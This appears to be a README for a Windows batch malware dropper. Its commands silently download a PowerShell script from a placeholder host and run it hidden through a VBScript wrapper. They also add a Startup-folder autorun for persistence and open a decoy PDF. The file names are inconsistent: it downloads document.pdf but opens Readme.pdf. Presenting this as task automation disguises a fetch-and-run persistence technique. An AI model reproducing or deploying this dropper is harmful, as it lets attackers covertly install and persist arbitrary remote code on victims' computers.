# batch_payload_dropper

This batch script, is designed to automate certain tasks during system startup by utilizing the Windows Startup mechanism. It involves downloading a PowerShell script and a PDF document from specified URLs and silently executing the PowerShell script upon system startup.

## Usage

1. **Downloading and Execution Steps:**
   - Change directory to the user's temporary folder:
     ```batch
     cd "%USERPROFILE%\AppData\Local\Temp\"
     ```

   - Create a VBScript file (`run.vbs`) to run the PowerShell script (`script.ps1`) silently:
     ```batch
     echo command = "powershell.exe -nologo -ExecutionPolicy Unrestricted -File %temp%\script.ps1" >run.vbs
     echo set shell = CreateObject("WScript.Shell") >>run.vbs
     echo shell.Run command,0 >>run.vbs
     ```

   - Download the PowerShell script (`script.ps1`) and the PDF file (`document.pdf`) from specified URLs using PowerShell:
     ```batch
     powershell.exe -WindowStyle hidden wget https://site.com/script.ps1 -OutFile %TEMP%\script.ps1
     powershell.exe -WindowStyle hidden wget https://site.com/document.pdf -OutFile %TEMP%\document.pdf
     ```

2. **Setting up Autorun:**
   - Change directory to the user's Startup folder:
     ```batch
     cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
     ```

   - Create a batch file (`autorun.bat`) to run the VBScript (`run.vbs`) on startup:
     ```batch
     echo wscript %USERPROFILE%\AppData\Local\Temp\run.vbs > autorun.bat
     ```

   - Start the `autorun.bat` script in the background using `start` command:
     ```batch
     start /B autorun.bat
     ```

3. **Open the PDF Document:**
   - Change directory back to the user's temporary folder:
     ```batch
     cd "%USERPROFILE%\AppData\Local\Temp\"
     ```

   - Open the PDF document (`Readme.pdf`) in the default PDF reader:
     ```batch
     start /max Readme.pdf
     ```

## Note

Please exercise caution when using scripts downloaded from the internet. Ensure that the source is trustworthy and the scripts are safe and intended for your use. Always prioritize security and best practices while automating tasks.
